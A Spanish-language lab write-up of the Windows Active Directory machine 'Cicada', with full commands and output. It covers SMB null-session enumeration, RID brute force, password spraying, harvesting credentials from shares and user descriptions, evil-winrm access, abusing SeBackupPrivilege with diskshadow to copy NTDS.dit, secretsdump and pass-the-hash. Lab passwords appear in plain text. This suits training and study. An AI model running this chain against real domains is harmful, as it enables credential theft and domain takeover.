# Cicada

![](../../../../~gitbook/image.md)Publicado: 24 de Junio de 2025
Autor: José Miguel Romero aKa x3m1Sec
Dificultad: ⭐ Easy
OS: Windows
### 📝 Descripción
Cicada es una máquina Windows de dificultad fácil que simula un entorno de Active Directory corporativo. La explotación comienza con la enumeración de servicios SMB sin autenticación, donde se descubre información crítica almacenada en recursos compartidos accesibles.El vector inicial involucra la obtención de credenciales a través de archivos de recursos humanos mal configurados, seguido de un ataque de password spraying que permite acceso inicial al sistema. La escalada de privilegios se aprovecha del privilegio `SeBackupPrivilege` del grupo Backup Operators para extraer la base de datos NTDS y realizar un dump completo de hashes del dominio.Esta máquina es excelente para practicar técnicas fundamentales de pentesting en Active Directory, incluyendo enumeración SMB, password spraying, abuso de privilegios de Windows y técnicas de pass-the-hash.
### 🎯 Puntos Clave
- Enumeración SMB: Identificación de recursos compartidos con acceso anónimo
- Information Disclosure: Credenciales expuestas en archivos de HR y scripts
- Password Spraying: Reutilización de credenciales contra múltiples cuentas
- Privilege Escalation: Abuso del privilegio `SeBackupPrivilege`
- NTDS Extraction: Extracción de la base de datos NTDS usando Volume Shadow
- Pass-the-Hash: Acceso administrativo mediante hashes NTLM

### 🔭 Reconocimiento

#### 🏓 Ping para verificación en base a TTL
💡 Nota: El TTL cercano a 128 sugiere que probablemente sea una máquina Windows.
#### 🚀 Escaneo de puertos

#### 🔍 Enumeración de servicios
⚠️ Añadimos el siguiente vhost a nuestro fichero /etc/hosts:
#### 📋 Análisis de Servicios Detectados
El escaneo revela un entorno típico de Active Directory con los siguientes servicios críticos:- Puerto 53 (DNS): Simple DNS Plus - Servicio DNS del dominio
- Puerto 88 (Kerberos): Autenticación Kerberos del AD
- Puerto 389/636 (LDAP/LDAPS): Directorio Active Directory
- Puerto 445 (SMB): Recursos compartidos - Vector de ataque principal
- Puerto 5985 (WinRM): Administración remota de Windows
- Dominio identificado: `cicada.htb`
- Controlador de dominio: `CICADA-DC.cicada.htb`

### 🌐 Enumeración de Servicios

#### 🗂️ SMB (Puerto 445) - Acceso Inicial
Ya que no disponemos de credenciales, comenzamos tratando de enumerar posibles recursos mediante una sesión nula:🎯 Recursos compartidos identificados:- HR: Acceso de lectura - Potencial información sensible
- DEV: Sin permisos aparentes inicialmente
- IPC$: Acceso de lectura - Para enumeración adicional
🔍 Enumeración del recurso HR📄 Contenido del archivo "Notice from HR.txt":![](../../../../~gitbook/image.md)🔑 Primera credencial obtenida: `Cicada$M6Corpb*@Lp#nZp!8`
#### 👥 Enumeración de Usuarios del Dominio
Tenemos una contraseña pero no tenemos usuarios, así que procedemos a enumerar usuarios mediante RID brute force:📝 Creación de lista de usuarios👥 Usuarios identificados:- Administrator
- Guest
- krbtgt
- CICADA-DC$
- john.smoulder
- sarah.dantelia
- michael.wrightson
- david.orelious
- emily.oscars

### 🎯 Password Spraying
Ahora realizamos password spraying con la contraseña obtenida contra todos los usuarios identificados:![](../../../../~gitbook/image.md)🎉 Primera cuenta válida encontrada: `michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8`
#### 🔍 Enumeración Autenticada
Con las credenciales válidas, procedemos a enumerar usuarios de forma autenticada:![](../../../../~gitbook/image.md)💎 Información crítica encontrada: El usuario `david.orelious` tiene su contraseña almacenada en el campo descripción.🔑 Segunda credencial obtenida: `david.orelious:aRt$Lp#7t*VQ!3`
#### 🗂️ Acceso al recurso DEV
Verificamos los permisos del usuario david.orelious sobre los recursos compartidos:![](../../../../~gitbook/image.md)✅ El usuario david.orelious tiene acceso de lectura al recurso DEV📁 Enumeración del recurso DEV📜 Análisis del script Backup_script.ps1:![](../../../../~gitbook/image.md)🔑 Tercera credencial obtenida: `emily.oscars:Q!3@Lp#M6b*7t*Vt`
### 🚀 Acceso Inicial

#### 🔐 Verificación de acceso WinRM
Verificamos si las nuevas credenciales nos permiten acceso remoto via WinRM:![](../../../../~gitbook/image.md)✅ Acceso WinRM exitoso con emily.oscars
#### 🏆 User Flag

### 🔝 Escalada de Privilegios

#### 🔍 Enumeración del Usuario
Analizamos la información del usuario emily.oscars:![](../../../../~gitbook/image.md)🎯 Información crítica identificada:- El usuario pertenece al grupo Backup Operators
- Tiene habilitado el privilegio SeBackupPrivilege
![](../../../../~gitbook/image.md)
#### 🎁 Abuso del Privilegio SeBackupPrivilege
El privilegio `SeBackupPrivilege` permite realizar copias de seguridad de archivos del sistema, incluyendo archivos críticos como:- `SYSTEM` (Clave de registro del sistema)
- `SAM` (Security Account Manager)
- `NTDS.dit` (Base de datos de Active Directory)
📋 Preparación del entornoPaso 1: Crear script VSS para montar copia de volumen:Creamos el archivo `vss.dsh` en nuestro host de ataque:Paso 2: Transferir archivos necesarios al host víctima:💾 Extracción de la base de datos NTDSPaso 3: Ejecutar script VSS para crear copia de volumen:![](../../../../~gitbook/image.md)Paso 4: Cargar módulos PowerShell y extraer archivos críticos:![](../../../../~gitbook/image.md)Paso 5: Descargar archivos extraídos:
#### 🔓 Extracción de Hashes
Utilizamos `impacket-secretsdump` para extraer todos los hashes del dominio:![](../../../../~gitbook/image.md)🎯 Hashes extraídos exitosamente, incluyendo el hash del Administrator:- `Administrator:[REDACTED]:[REDACTED]:::`

### 👑 Acceso Administrativo

#### 🔑 Pass-the-Hash Attack
Utilizamos el hash NTLM del Administrator para ganar acceso completo via WinRM:
#### 🏆 Root Flag

- [🎯 Puntos Clave](#puntos-clave)
- [🔭 Reconocimiento](#reconocimiento)
- [🌐 Enumeración de Servicios](#enumeracion-de-servicios-1)
- [🎯 Password Spraying](#password-spraying)
- [🚀 Acceso Inicial](#acceso-inicial)
- [🔝 Escalada de Privilegios](#escalada-de-privilegios)
- [👑 Acceso Administrativo](#acceso-administrativo)

```
❯ ping -c2 10.10.11.35
PING 10.10.11.35 (10.10.11.35) 56(84) bytes of data.
64 bytes from 10.10.11.35: icmp_seq=1 ttl=127 time=48.1 ms
64 bytes from 10.10.11.35: icmp_seq=2 ttl=127 time=48.2 ms

--- 10.10.11.35 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1002ms
rtt min/avg/max/mdev = 48.060/48.115/48.170/0.055 ms
```

```
ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.35 | grep ^[0-9] | cut -d '/' -f1 | tr '\n' ',' | sed s/,$//)
```

```
echo $ports
53,88,135,139,389,445,464,593,636,3268,3269,5985,57348
```

```
nmap -sC -sV -p$ports 10.10.11.35 -oN services.txt

Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-24 13:18 CEST
Stats: 0:01:29 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.94% done; ETC: 13:20 (0:00:00 remaining)
Nmap scan report for 10.10.11.35
Host is up (0.048s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-06-24 18:19:04Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
|_ssl-date: TLS randomness does not represent time
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
|_ssl-date: TLS randomness does not represent time
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
|_ssl-date: TLS randomness does not represent time
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
|_ssl-date: TLS randomness does not represent time
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
57348/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 7h00m01s
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2025-06-24T18:1
```

```
echo "10.10.11.35 cicada.htb" | sudo tee -a /etc/hosts
```

```
netexec smb 10.10.11.35 -u anonymous -p '' --shares
SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\anonymous: (Guest)
SMB         10.10.11.35     445    CICADA-DC        [*] Enumerated shares
SMB         10.10.11.35     445    CICADA-DC        Share           Permissions     Remark
SMB         10.10.11.35     445    CICADA-DC        -----           -----------     ------
SMB         10.10.11.35     445    CICADA-DC        ADMIN$                          Remote Admin
SMB         10.10.11.35     445    CICADA-DC        C$                              Default share
SMB         10.10.11.35     445    CICADA-DC        DEV
SMB         10.10.11.35     445    CICADA-DC        HR              READ
SMB         10.10.11.35     445    CICADA-DC        IPC$            READ            Remote IPC
SMB         10.10.11.35     445    CICADA-DC        NETLOGON                        Logon server share
SMB         10.10.11.35     445    CICADA-DC        SYSVOL                          Logon server share
```

```
smbclient -N \\\\10.10.11.35\\HR
Try "help" to get a list of possible commands.
smb: \> dir
.                                   D        0  Thu Mar 14 13:29:09 2024
..                                  D        0  Thu Mar 14 13:21:29 2024
Notice from HR.txt                  A     1266  Wed Aug 28 19:31:48 2024

4168447 blocks of size 4096. 477828 blocks available
smb: \> get "Notice from HR.txt"
getting file \Notice from HR.txt of size 1266 as Notice from HR.txt (6.4 KiloBytes/sec) (average 6.4 KiloBytes/sec)
```

```
netexec smb 10.10.11.35 -u anonymous -p '' --rid-brute
SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\anonymous: (Guest)
SMB         10.10.11.35     445    CICADA-DC        498: CICADA\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        500: CICADA\Administrator (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        501: CICADA\Guest (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        502: CICADA\krbtgt (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        512: CICADA\Domain Admins (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        513: CICADA\Domain Users (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        514: CICADA\Domain Guests (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        515: CICADA\Domain Computers (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        516: CICADA\Domain Controllers (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        517: CICADA\Cert Publishers (SidTypeAlias)
SMB         10.10.11.35     445    CICADA-DC        518: CICADA\Schema Admins (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        519: CICADA\Enterprise Admins (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        520: CICADA\Group Policy Creator Owners (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        521: CICADA\Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        522: CICADA\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        525: CICADA\Protected Users (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        526: CICADA\Key Admins (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        527: CICADA\Enterprise Key Admins (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        553: CICADA\RAS and IAS Servers (SidTypeAlias)
SMB         10.10.11.35     445    CICADA-DC        571: CICADA\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.10.11.35     445    CICADA-DC        572: CICADA\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.010.11.35     445    CICADA-DC        1000: CICADA\CICADA-DC$ (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        1101: CICADA\DnsAdmins (SidTypeAlias)
SMB         10.10.11.35     445    CICADA-DC        1102: CICADA\DnsUpdateProxy (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        1103: CICADA\Groups (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        1104: CICADA\john.smoulder (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        1105: CICADA\sarah.dantelia (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        1106: CICADA\michael.wrightson (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        1108: CICADA\david.orelious (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        1109: CICADA\Dev Support (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        1601: CICADA\emily.oscars (SidTypeUser)
```

```
netexec smb 10.10.11.35 -u anonymous -p '' --rid-brute 2>/dev/null | awk -F '\\' '{print $2}' | grep 'SidTypeUser' | sed 's/ (SidTypeUser)//' > Users.txt
```

```
netexec smb 10.10.11.35 -u Users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8' --continue-on-success
```

```
netexec smb 10.10.11.35 -u 'michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8' --users
```

```
netexec smb 10.10.11.35 -u 'david.orelious' -p 'aRt$Lp#7t*VQ!3' --shares
```

```
smbclient \\\\10.10.11.35\\DEV -U "david.orelious"
Password for [WORKGROUP\david.orelious]:
Try "help" to get a list of possible commands.
smb: \> dir
.                                   D        0  Thu Mar 14 13:31:39 2024
..                                  D        0  Thu Mar 14 13:21:29 2024
Backup_script.ps1                   A      601  Wed Aug 28 19:28:22 2024

4168447 blocks of size 4096. 478862 blocks available
smb: \> get Backup_script.ps1
getting file \Backup_script.ps1 of size 601 as Backup_script.ps1 (3.0 KiloBytes/sec) (average 3.0 KiloBytes/sec)
```

```
evil-winrm -i 10.10.11.35 -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt'

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> whoami
cicada\emily.oscars
```

```
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA> cd Desktop
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> dir

Directory: C:\Users\emily.oscars.CICADA\Desktop

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---         6/24/2025  11:12 AM             34 user.txt

*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> type user.txt
[REDACTED]
```

```
cat > vss.dsh
```
unix2dos vss.dsh
```

```
# Descargar DLLs necesarias
wget https://github.com/k4sth4/SeBackupPrivilege/raw/refs/heads/main/SeBackupPrivilegeCmdLets.dll
wget https://github.com/k4sth4/SeBackupPrivilege/raw/refs/heads/main/SeBackupPrivilegeUtils.dll

# Transferir via evil-winrm
upload vss.dsh c:\\Temp\\vss.dsh
upload SeBackupPrivilegeCmdLets.dll c:\\Temp\\SeBackupPrivilegeCmdLets.dll
upload SeBackupPrivilegeUtils.dll c:\\Temp\\SeBackupPrivilegeUtils.dll
```

```
*Evil-WinRM* PS C:\Temp> diskshadow /s c:\\Temp\\vss.dsh
```

```
# Importar módulos de SeBackupPrivilege
*Evil-WinRM* PS C:\Temp> Import-Module .\SeBackupPrivilegeCmdLets.dll
*Evil-WinRM* PS C:\Temp> Import-Module .\SeBackupPrivilegeUtils.dll

# Copiar NTDS.dit desde la copia de volumen
*Evil-WinRM* PS C:\Temp> Copy-FileSeBackupPrivilege z:\\Windows\\ntds\\ntds.dit c:\\Temp\\ntds.dit

# Extraer claves de registro SYSTEM y SAM
*Evil-WinRM* PS C:\Temp> reg save HKLM\SYSTEM SYSTEM.SAV
*Evil-WinRM* PS C:\Temp> reg save HKLM\SAM SAM.SAV
```

```
*Evil-WinRM* PS C:\Temp> download SYSTEM.SAV
*Evil-WinRM* PS C:\Temp> download SAM.SAV
*Evil-WinRM* PS C:\Temp> download ntds.dit
```

```
impacket-secretsdump -ntds ntds.dit -system SYSTEM.SAV -hashes lmhash:nthash LOCAL
```

```
evil-winrm -i 10.10.11.35 -u Administrator -H ''

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
cicada\administrator
```

```
*Evil-WinRM* PS C:\Users\Administrator\Documents> dir C:\Users\Administrator\Desktop

Directory: C:\Users\Administrator\Desktop

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---         6/24/2025  11:12 AM             34 root.txt

*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
[REDACTED]
```
